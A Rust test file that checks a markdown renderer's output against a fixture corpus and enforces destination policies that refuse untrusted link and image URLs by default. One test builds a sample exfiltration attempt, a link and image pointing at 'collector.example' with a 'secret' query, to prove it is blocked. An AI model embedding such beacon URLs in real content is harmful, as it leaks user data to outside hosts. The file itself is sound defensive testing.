//! Certifies the deterministic markdown renderer against the shared
//! cross-host corpus (`wire-format-fixtures/markdown/corpus.json`): every
//! fixture's render must equal its pinned `html` byte-for-byte.
//! Skips cleanly when the corpus is absent (standalone checkout).
//!
//! A fixture MAY carry an optional `policy` naming the destination policy the
//! render is performed under (`WIRE_FORMAT.md` §14.1). The corpus never carries
//! a policy as DATA — a policy an artefact can supply is one a hostile artefact
//! can widen — so the name is mapped to a policy this host CONSTRUCTS, and an
//! unrecognised name **fails** rather than falling back to permissive: a silent
//! fallback turns a fixture the host cannot evaluate into one it appears to
//! pass.

use std::path::PathBuf;

use fuaran_rs::canonical::{JVal, parse, render_canonical};
use fuaran_rs::render::egress::{
    EgressClass, EgressOrigin, EgressPolicy, deny_non_local_egress, permissive_egress,
};
use fuaran_rs::render::markdown::{to_html, to_html_with_egress};
use fuaran_rs::render::{BindingSources, render_to_html, render_to_html_with_egress};
use fuaran_rs::wire::decode_node;

fn find_corpus() -> Option<PathBuf> {
    let mut dir: PathBuf = env!("CARGO_MANIFEST_DIR").into();
    loop {
        let file = dir
            .join("wire-format-fixtures")
            .join("markdown")
            .join("corpus.json");
        if file.is_file() {
            return Some(file);
        }
        if !dir.pop() {
            return None;
        }
    }
}

fn str_field(v: &JVal, key: &str) -> Option<String> {
    match v.field(key) {
        Some(JVal::Str(s)) => Some(s.clone()),
        _ => None,
    }
}

/// `denyNonLocal`, plus exact host `cdn.example` scoped to **media** and host
/// suffix `docs.example` scoped to **hyperlink** (§14.1's conformance table).
/// This is what makes the gate falsifiable in both directions: a host that
/// refused every non-local destination unconditionally fails its allowed
/// fixtures, and one that ignored the policy fails the `denyNonLocal` ones.
fn declared_example() -> EgressPolicy {
    deny_non_local_egress()
        .allow_origin(
            EgressOrigin::ExactHost("cdn.example".to_string()),
            &[EgressClass::Media],
        )
        .allow_origin(
            EgressOrigin::HostSuffix("docs.example".to_string()),
            &[EgressClass::Hyperlink],
        )
}

/// The policy a fixture's `policy` name denotes, or `Err` naming one this host
/// does not construct. Never a fallback.
fn policy_for(name: Option<&str>) -> Result<EgressPolicy, String> {
    match name {
        None | Some("permissive") => Ok(permissive_egress()),
        Some("denyNonLocal") => Ok(deny_non_local_egress()),
        Some("declaredExample") => Ok(declared_example()),
        Some(other) => Err(format!(
            "unknown fixture policy {other:?} — this host constructs \
             permissive / denyNonLocal / declaredExample. Refusing to fall back \
             to permissive: that would report an unevaluated fixture as passing."
        )),
    }
}

/// The no-silent-fallback rule, pinned. A corpus that grows a policy name this
/// host does not construct must FAIL the gate; the failure mode this guards
/// against is a fixture that is never evaluated being reported as passing.
#[test]
fn an_unrecognised_policy_name_is_refused_not_defaulted() {
    assert!(policy_for(Some("someFuturePolicy")).is_err());
    assert!(policy_for(Some("PERMISSIVE")).is_err(), "names are exact");
    assert_eq!(policy_for(None).unwrap(), permissive_egress());
    assert_eq!(policy_for(Some("permissive")).unwrap(), permissive_egress());
    assert_eq!(
        policy_for(Some("denyNonLocal")).unwrap(),
        deny_non_local_egress()
    );
    assert_eq!(
        policy_for(Some("declaredExample")).unwrap(),
        declared_example()
    );
}

#[test]
fn markdown_corpus_renders_byte_identical() {
    let Some(path) = find_corpus() else {
        eprintln!("markdown corpus not found; skipping (standalone checkout)");
        return;
    };
    let raw = std::fs::read_to_string(&path).expect("reading markdown corpus");
    let corpus = parse(&raw).expect("markdown corpus parses");
    let Some(JVal::Arr(fixtures)) = corpus.field("fixtures") else {
        panic!("markdown corpus declares no fixtures array");
    };
    let mut failures: Vec<String> = Vec::new();
    let mut non_permissive = 0usize;
    for fixture in fixtures {
        let id = str_field(fixture, "id").expect("fixture id");
        let source = str_field(fixture, "source").expect("fixture source");
        let expected = str_field(fixture, "html").expect("fixture html");
        let named = str_field(fixture, "policy");
        let policy = match policy_for(named.as_deref()) {
            Ok(p) => p,
            Err(why) => {
                failures.push(format!("{id}: {why}"));
                continue;
            }
        };
        if named.as_deref().is_some_and(|n| n != "permissive") {
            non_permissive += 1;
        }
        let actual = to_html_with_egress(&policy, &source);
        if actual != expected {
            failures.push(format!(
                "{id} (policy {}):\n  source   {source:?}\n  expected {expected:?}\n  actual   {actual:?}",
                named.as_deref().unwrap_or("permissive")
            ));
            continue;
        }
        // The pure form IS the permissive case — asserted, not merely intended.
        if named.as_deref().is_none_or(|n| n == "permissive") {
            let pure = to_html(&source);
            if pure != expected {
                failures.push(format!(
                    "{id}: to_html diverged from to_html_with_egress(permissive)\n  \
                     expected {expected:?}\n  actual   {pure:?}"
                ));
            }
        }
    }
    assert!(
        failures.is_empty(),
        "{} of {} markdown fixtures diverged:\n{}",
        failures.len(),
        fixtures.len(),
        failures.join("\n")
    );
    // Without this the whole gate could run on the permissive path and stay
    // green on a host that never implemented §14.1 at all.
    assert!(
        non_permissive > 0,
        "the markdown corpus carries no non-permissive `policy` fixture — the \
         destination-policy leg of this gate is vacuous"
    );
    eprintln!(
        "markdown corpus: {} fixtures byte-identical ({non_permissive} under a \
         non-permissive destination policy)",
        fixtures.len()
    );
}

// ─── The AMBIENT leg (Phase 1037) ────────────────────────────────────────────
//
// The gate above is a SEAM assertion: it calls the policy-taking markdown
// function directly, so it proves the function honours a policy it was handed.
// It cannot prove the RENDERER hands one over — which is the whole difference
// between a policy that is available and one that is ambient, and the state this
// host was in between Phase 1032 and this one.
//
// So the same fixtures run again through the render path, on a `Markdown` node,
// and the `denyNonLocal` ones run under a DEFAULT-CONSTRUCTED context with no
// policy named anywhere. That is the acceptance criterion stated as a test: if a
// caller has to opt in, this leg goes red.

/// A one-node `Markdown` tree carrying `source` as its literal text.
fn markdown_node_json(source: &str) -> String {
    format!(
        r#"{{"id":"md","kind":{{"$type":"Markdown","text":{{"$type":"Literal","text":{}}}}}}}"#,
        render_canonical(&JVal::Str(source.to_string()))
    )
}

/// The renderer's own wrapper around a markdown body. The node's own wrapper
/// (id, node-id marker, class vocabulary) sits outside this and is not the
/// subject here, so the assertion is a byte-exact CONTAINS of this fragment
/// rather than a whole-document equality — the markdown body must appear
/// unreformatted inside it.
fn wrap(html: &str) -> String {
    format!(r#"<div class="fuaran-markdown">{html}</div>"#)
}

#[test]
fn the_markdown_corpus_renders_the_same_through_the_ambient_render_path() {
    let Some(path) = find_corpus() else {
        eprintln!("markdown corpus not found; skipping (standalone checkout)");
        return;
    };
    let raw = std::fs::read_to_string(&path).expect("reading markdown corpus");
    let corpus = parse(&raw).expect("markdown corpus parses");
    let Some(JVal::Arr(fixtures)) = corpus.field("fixtures") else {
        panic!("markdown corpus declares no fixtures array");
    };
    let mut failures: Vec<String> = Vec::new();
    let mut ambient_deny = 0usize;
    for fixture in fixtures {
        let id = str_field(fixture, "id").expect("fixture id");
        let source = str_field(fixture, "source").expect("fixture source");
        let expected = wrap(&str_field(fixture, "html").expect("fixture html"));
        let named = str_field(fixture, "policy");
        let tree = decode_node(&markdown_node_json(&source)).expect("the markdown node decodes");
        let sources = BindingSources::default();

        // The load-bearing branch. A `denyNonLocal` fixture renders through the
        // CONVENIENCE entry point — no policy named, nothing declared — and must
        // still produce the refusing HTML. A host whose renderer reached the
        // pure permissive path would render the destination and fail here.
        let actual = match named.as_deref() {
            Some("denyNonLocal") => {
                ambient_deny += 1;
                render_to_html(&tree, &sources)
            }
            other => match policy_for(other) {
                Ok(policy) => render_to_html_with_egress(&policy, &tree, &sources),
                Err(why) => {
                    failures.push(format!("{id}: {why}"));
                    continue;
                }
            },
        };
        // The fixture's html sits inside the wrapper byte-exact — the renderer
        // wraps the markdown body, it never reformats it.
        if !actual.contains(&expected) {
            failures.push(format!(
                "{id} (policy {}):\n  expected to contain {expected:?}\n  actual            {actual:?}",
                named.as_deref().unwrap_or("permissive")
            ));
        }
    }
    assert!(
        failures.is_empty(),
        "{} of {} markdown fixtures diverged through the ambient render path:\n{}",
        failures.len(),
        fixtures.len(),
        failures.join("\n")
    );
    assert!(
        ambient_deny > 0,
        "no `denyNonLocal` fixture reached the default-constructed render context \
         — the ambient leg of this gate is vacuous"
    );
    eprintln!(
        "markdown corpus through the render path: {} fixtures byte-identical \
         ({ambient_deny} under a DEFAULT-constructed context, no policy named)",
        fixtures.len()
    );
}

#[test]
fn the_non_markdown_call_sites_are_ambient_too() {
    // One decoded tree, two destinations, one host — and nothing declared. The
    // `Image` is the case that matters most: the browser fetches an `src` with
    // no user act, so rendering the tree IS the request.
    let tree = decode_node(
        r#"{"id":"root","kind":{"$type":"Box","children":[
             {"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"https://collector.example/x?s=secret"},"label":{"$type":"Literal","text":"Docs"}}},
             {"id":"i","kind":{"$type":"Image","alt":{"$type":"Literal","text":"Alt"},"src":{"$type":"Static","value":"https://collector.example/x?s=secret"},"variant":"Default"}}
           ],"layout":{"$type":"Auto"},"role":"Group"}}"#,
    )
    .expect("the tree decodes");

    let html = render_to_html(&tree, &BindingSources::default());

    assert_eq!(
        html.matches("about:blank#fuaran-egress-refused").count(),
        2,
        "both destinations refuse under the default context: {html}"
    );
    assert!(html.contains(r#"data-fuaran-egress-refused="hyperlink:collector.example""#));
    assert!(html.contains(r#"data-fuaran-egress-refused="media:collector.example""#));
    // The marker names the class and the host, and NEVER the path or query —
    // the query string of a refused exfiltration attempt is the payload itself.
    assert!(
        !html.contains("secret") && !html.contains("?s=") && !html.contains("/x"),
        "the refused URL's path or query leaked into the emission: {html}"
    );

    // …and the same tree under a policy that declares the host emits it. Without
    // this the assertions above would also pass on a host that refused
    // everything unconditionally.
    let declared = deny_non_local_egress().allow_origin(
        EgressOrigin::ExactHost("collector.example".to_string()),
        &[EgressClass::Hyperlink, EgressClass::Media],
    );
    let allowed = render_to_html_with_egress(&declared, &tree, &BindingSources::default());
    assert_eq!(
        allowed
            .matches("https://collector.example/x?s=secret")
            .count(),
        2
    );
    assert!(!allowed.contains("fuaran-egress-refused"));
}
